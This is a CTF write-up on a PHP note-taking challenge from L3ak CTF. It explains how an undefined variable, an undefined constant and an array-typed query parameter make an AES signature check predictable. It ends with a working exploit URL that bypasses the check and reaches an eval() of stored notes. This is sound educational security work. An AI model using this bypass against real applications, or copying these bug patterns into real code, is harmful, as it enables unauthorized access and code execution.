---
title:  "Certay revenge Web Challenge - From L3ak CTF"
description: Web challenge from L3ak CTF, a simple note-taking system with user authentication, where the goal is to bypass the required hash using PHP language pitfalls.
image: 
  path: /assets/img/blog/blackhat/wolv_black_hat.jpg
tags: [ctf, web, PHP, AES, pitfalls]
date:   2025-07-15 13:49:56 +0300
categories: [CTFs]
---
**Last Modified: 2025-07-14 06:51**

> Probably you need to understand our language to get some of the super powers?

The challenge mainly is about spotting pitfalls of PHP to be able to bypass bypass the required hash.

The web application is a simple note-taking system with user authentication:

1. **User Registration/Login**: Users can register and login via register.php and login.php
2. **Session Management**: PHP sessions track logged-in users with `$_SESSION['user_id']`
3. **Note Storage**: Users can store private notes via post_note.php
4. **Dashboard Access**: dashboard.php displays notes after signature verification

### Normal Authentication Flow
```php
// Login creates session
$_SESSION['user_id'] = $user_id;
$_SESSION['yek'] = openssl_random_pseudo_bytes(16); // 16-byte session key

// Dashboard requires both session AND signature verification
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

// Additional signature check for sensitive operations
if (custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === $_GET['hash']) {
    // Execute stored notes via eval()
}
```

### Encryption Implementation
#### Encryption Functions
```php
function safe_sign($data) {
    return openssl_encrypt($data, 'aes-256-cbc', KEY, 0, iv);
}

function custom_sign($data, $key, $vi) {
    return openssl_encrypt($data, 'aes-256-cbc', $key, 0, $vi);
}
```
#### Signature Verification Logic
```php
if (custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === $_GET['hash']) {
    // Authentication successful - execute user notes
    eval($content);
}
```
**How it's supposed to work:**

1. `safe_sign($_GET['key'])` encrypts user input with server's secret `KEY`
2. Result becomes IV for `custom_sign()`
3. `custom_sign()` encrypts `$_GET['msg']` using session key `$yek`
4. Final result must match `$_GET['hash']`

The app takes three parameters and do that :
![alt text](<../assets/img/blog/attachments-certay/Pasted image 20250716130912.png>)


## Exploit Chain
### PHP Language Pitfalls Exploited
#### Undefined Constant Behavior
```php
<?php
define('yek', $_SESSION['yek']);

// Later in code:
custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === $_GET['hash']
```

**Pitfall**: `$yek` (variable) vs `yek` (constant)

- **Expected**: `$yek` should reference the constant `yek`
- **Reality**: `$yek` is an undefined variable, defaults to `null`, if you want to use the defined value you should use `yek` instead of `$yek`
- **Impact**: Encryption key becomes empty string instead of 16-byte session key (as the second parameter to `custom_sign() is the encryption key.)

####  Undefined Constant String Conversion

```php
return openssl_encrypt($data, 'aes-256-cbc', KEY, 0, iv);
```

**Pitfall**: `iv` constant is never defined

- **Expected**: `iv` should be a defined constant
- **Reality**: PHP converts undefined constant to string `"iv"`. so the `iv` will become literally "iv"
- **Impact**: IV becomes predictable 2-byte string instead of random 16 bytes
####  OpenSSL IV Padding Behavior (it's not a pitfall)

```php
openssl_encrypt($data, 'aes-256-cbc', KEY, 0, "iv");
```
 AES-256-CBC requires exactly 16-byte IV

- **Input**: `"iv"` (2 bytes)
- **OpenSSL behavior**: Pads with null bytes to 16 bytes
- **Result**: `"iv\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"` (predictable)
#### 4. Array Parameter Handling

```php

if (isset($_GET['msg']) && isset($_GET['hash']) && isset($_GET['key'])) {

    if (custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === $_GET['hash']) {
```

**Pitfall**: `openssl_encrypt()` expects string, receives array

- **Input**: `key[]` creates `$_GET['key'] = []` (empty array)
- **OpenSSL behavior**: Returns :

```
Warning: openssl_encrypt() expects parameter 1 to be string, array given in /home/user/scripts/code.php on line 7
NULL
```
![alt text](<../assets/img/blog/attachments-certay/Pasted image 20250716132852.png>)

- **Impact**: 

```php
// URL: dashboard.php?key[]

// Creates: $_GET['key'] = []

// Results in: safe_sign([]) → NULL

// Then: custom_sign($_GET['msg'], $yek, NULL)
// yek is also empty, we showed that previously

```

*The Real Signature Check is* :
```php
custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === $_GET['hash']
```
but with such behaviors it becomes:
```php

custom_sign($_GET['msg'], null, NULL) === $_GET['hash']
``` 
which is :
```php
openssl_encrypt($_GET['msg'], 'aes-256-cbc', '', 0, NULL) === $_GET['hash']
```
**How NULL is Handled as IV**

When `NULL` which is `$yek` is passed as the IV parameter:

- **PHP converts `NULL` to empty string `""`**
- **OpenSSL pads empty string to 16 bytes with null bytes**
- **Effective IV becomes 16 null bytes**
*To make sure of this behavior i created this test:*

```php

// Test the actual behavior

$result1 = openssl_encrypt("test", 'aes-256-cbc', '', 0, NULL);

$result2 = openssl_encrypt("test", 'aes-256-cbc', '', 0, false);

$result3 = openssl_encrypt("test", 'aes-256-cbc', '', 0, "");

  

echo "NULL IV: " . $result1 . "\n";

echo "false IV: " . $result2 . "\n";

echo "empty string IV: " . $result3 . "\n";

?>

output :
NULL IV: 2HB5iFgiP0Vk00CxA/ZSew==

false IV: 2HB5iFgiP0Vk00CxA/ZSew==

empty string IV: 2HB5iFgiP0Vk00CxA/ZSew==

```

**So now all i need making these nested conditions returns true :**

```php
if (isset($_GET['msg']) && isset($_GET['hash']) && isset($_GET['key'])) {

    if (custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === $_GET['hash']) {
```

**All parameters now predictable:**

- **Message**: `$_GET['msg']` (user controlled)
- **$yek** : Empty
- **safe_sign($\_GET['key']))**: `''` (empty string from null, it's NULL because of `GET['key'` is set to `key[]` )

### Exploit

```
http://server/dashboard.php?msg=test&key[]=&hash=2HB5iFgiP0Vk00CxA%2FZSew%3D%3D
```

![Getting the Flag](<../assets/img/blog/attachments-certay/Screenshot 2025-07-14 161837.png>)
